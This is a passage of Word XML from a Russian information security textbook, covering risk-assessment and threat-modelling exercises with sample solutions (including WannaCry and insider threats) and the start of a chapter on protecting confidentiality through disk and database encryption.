    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое APT (Advanced Persistent Threat)?** Чем APT отличается от обычных хакеров?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое ransomware?** Приведи примеры (WannaCry, Colonial Pipeline).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Практические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача: Оценка рисков.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   У тебя веб-приложение. Есть три угрозы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**A**: SQL-инъекция (вероятность 70%, ущерб $100,000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**B**: DDoS-атака (вероятность 30%, ущерб $10,000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**C**: Физическая кража сервера (вероятность 5%, ущерб $50,000)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Рассчитай риски и расставь приоритеты (что исправлять в первую очередь).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**A**: Риск = 0.7 × 100,000 = **$70,000** (критический)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**B**: Риск = 0.3 × 10,000 = **$3,000** (средний)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**C**: Риск = 0.05 × 50,000 = **$2,500** (низкий)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Приоритет</w:t>
      </w:r>
      <w:r>
        <w:t>: A → B → C.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача: Модель угроз для блога.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Ты делаешь блог о программировании. Определи:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие активы нужно защищать?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кто может атаковать? (Реалистично!)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие угрозы наиболее вероятны?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие меры защиты необходимы?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примерное решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Активы**: контент (статьи), аккаунт администратора, база комментариев.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Угрозы**: script kiddies (автоматические боты ищут уязвимости), спам-боты.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вероятные атаки**: брутфорс пароля админки, SQL-инъекция (если есть формы), DDoS (маловероятно, если блог не популярен).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Меры**: HTTPS, сильный пароль + 2FA, обновления WordPress/плагинов, резервное копирование.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача: WannaCry.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Прочитай про </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WannaCry</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (раздел 9.3.6). Ответь:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какая уязвимость использовалась?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как можно было предотвратить заражение?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Что такое "kill switch" и как он остановил вирус?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уязвимость**: EternalBlue (SMBv1 в Windows), патч MS17-010.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Предотвращение**: обновить Windows (патч вышел **за месяц до атаки**), отключить SMBv1.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Kill Switch**: вирус проверял домен `iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com`. Если домен существует → вирус останавливается. Marcus Hutchins зарегистрировал домен → вирус остановился.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача: Защита от инсайдера.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    В компании работает 50 сотрудников. У всех есть доступ к общей папке с финансовыми отчётами. Один из сотрудников может слить данные конкурентам. Как защититься?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примерное решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Принцип наименьших привилегий**: не все 50 сотрудников должны иметь доступ к финансам. Только финансовый директор, бухгалтеры, CEO.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DLP (Data Loss Prevention)**: блокировать копирование на USB, отправку на личный email.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Мониторинг**: логировать, кто открывал файлы, кто скачивал.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Водяные знаки (Watermarking)**: если файл утечёт, можно понять, кто слил (в документ встраивается уникальный ID сотрудника, невидимый глазом).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**NDA (Non-Disclosure Agreement)**: договор о неразглашении с юридической ответственностью.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статус</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Глава готова ✅  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дата</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 15 января 2026  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Автор</w:t>
      </w:r>
      <w:r>
        <w:t>: AI Assistant (Claude Sonnet 4.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Следующая глава</w:t>
      </w:r>
      <w:r>
        <w:t>: 9.04 Противодействие нарушению конфиденциальности (методы защиты от утечек данных, шифрование, контроль доступа, DLP).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 9.4. Противодействие нарушению конфиденциальности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение: Защищаем конфиденциальность, пока хакеры не добрались до твоих котиков</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, дружище, в главе 9.03 мы разобрали, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>какие угрозы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> существуют (внутренние/внешние, природные, техногенные), в главе 9.01 составили </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>политику безопасности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, в главе 9.02 научились </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>шифровать данные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Теперь вопрос: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>а как на практике защитить конфиденциальность?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Конфиденциальность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это первая буква в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CIA Triad</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Confidentiality, Integrity, Availability). Цель: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>секретные данные видят только те, кому положено</w:t>
      </w:r>
      <w:r>
        <w:t>. Не соседи по Wi-Fi, не хакеры, не инсайдеры, не спецслужбы (ну, иногда и спецслужбы, но это уже другой уровень параноии).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальность</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**3.2 миллиарда паролей** украдены в 2021 году (отчёт Cybersecurity Ventures)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**60%** утечек данных — из-за **слабых или украденных паролей**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Средний срок обнаружения утечки данных: **207 дней** (IBM, 2023) — хакеры сидят в твоей системе полгода, а ты даже не в курсе</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**82%** утечек данных — из-за **человеческого фактора** (случайная отправка email не тому человеку, клик на фишинг, слабый пароль)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему важно защищать конфиденциальность?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Финансовые потери**: Equifax заплатила **$700 млн штрафов** за утечку 147 млн записей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Репутация**: После утечки клиенты уходят к конкурентам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Юридические проблемы**: GDPR (Европа) и 152-ФЗ (Россия) — штрафы до **4% годового оборота** за утечку персональных данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Личная безопасность**: Утекли медицинские записи → страховая компания отказывает в полисе; утекли номера карт → списали деньги</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В этой главе мы разберём:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрование данных (at rest, in transit, in use)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Контроль доступа (RBAC, MFA, биометрия)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DLP (Data Loss Prevention) — предотвращение утечек</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Мониторинг и логирование (SIEM, форензика)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обучение персонала (фишинг, пароли)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Организационные меры (NDA, водяные знаки)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Физическая безопасность (защита дата-центров)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Резервное копирование (зашифрованный backup)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.01 (Политика безопасности)** — тут мы реализуем политику на практике</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.02 (Криптография)** — используем шифрование как основной метод защиты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.03 (Угрозы ИБ)** — защищаемся от угроз конфиденциальности (перехват трафика, инсайдеры, фишинг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.05 (Атаки)** — защита от конкретных атак (MITM, phishing, социальная инженерия)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.04 (Протоколы Internet)** — HTTPS, SSH, VPN для защиты трафика</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.4.1. Шифрование данных: Главная линия обороны</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Первое правило защиты конфиденциальности: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ШИФРУЙ ВСЁ</w:t>
      </w:r>
      <w:r>
        <w:t>. Серьёзно. Диски, базы данных, трафик, backup, мессенджеры, облачные хранилища — всё.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Потому что если хакер украдёт зашифрованный диск — он получит набор случайных байтов. Без ключа эти данные бесполезны (ну, если ты не используешь пароль `123456` для шифрования, конечно).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрование в покое (Data at Rest)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Шифрование данных, которые </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>хранятся</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на диске, в БД, на флешке, в облаке.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Чтобы при краже устройства (ноутбук, сервер, жёсткий диск) или при физическом доступе (кто-то зашёл в серверную) данные остались недоступными.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрование диска (Full Disk Encryption, FDE)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Весь диск шифруется одним ключом. При загрузке ОС запрашивает пароль → расшифровывает загрузочный сектор → ОС работает с расшифрованными данными в оперативной памяти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Популярные решения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**BitLocker (Windows)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Встроен в Windows (Pro/Enterprise)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использует **AES-128 или AES-256**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ключи хранятся в **TPM** (Trusted Platform Module) — чип на материнской плате</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если вытащить диск из ноутбука и вставить в другой компьютер → данные не прочитать без пароля</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример включения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Панель управления → BitLocker → Включить BitLocker → Сохранить ключ восстановления (48-значный)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: Если забыл пароль и потерял ключ восстановления → данные потеряны навсегда.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**LUKS (Linux Unified Key Setup)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Стандарт для Linux</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется в Ubuntu, Fedora, Arch</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Команда для шифрования раздела:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   # Зашифровать раздел /dev/sdb1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   cryptsetup luksFormat /dev/sdb1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   # Открыть зашифрованный раздел</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   cryptsetup open /dev/sdb1 encrypted_disk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   # Теперь монтируем /dev/mapper/encrypted_disk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   mount /dev/mapper/encrypted_disk /mnt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t>: При каждой загрузке нужно вводить пароль. Если сервер перезагрузился ночью (отключили свет) → он не загрузится, пока ты не приедешь и не введёшь пароль.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**FileVault (macOS)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Встроен в macOS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использует **XTS-AES-128**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ключ привязан к логину пользователя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Можно разблокировать через iCloud (если забыл пароль)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрование базы данных (TDE — Transparent Data Encryption)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Чтобы даже если хакер украл файлы БД (например, скопировал `.mdf` файл SQL Server), он не смог прочитать данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>СУБД автоматически шифрует данные при записи на диск</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При чтении — автоматически расшифровывает</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для приложения это **прозрачно** (отсюда название Transparent)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SQL Server**: поддерживает TDE (AES-128/256)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Oracle Database**: Advanced Security Option (ASO)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MySQL**: InnoDB Encryption (с MySQL 5.7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**PostgreSQL**: pgcrypto (расширение для шифрования столбцов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минус TDE</w:t>
      </w:r>
      <w:r>
        <w:t>: Если БД запущена — данные доступны. Защита только от кражи файлов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрование в движении (Data in Transit)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Шифрование данных, которые </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>передаются</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> по сети (от клиента к серверу, между серверами).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Чтобы при перехвате трафика (MITM-атака, сниффинг Wi-Fi) данные остались недоступными.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
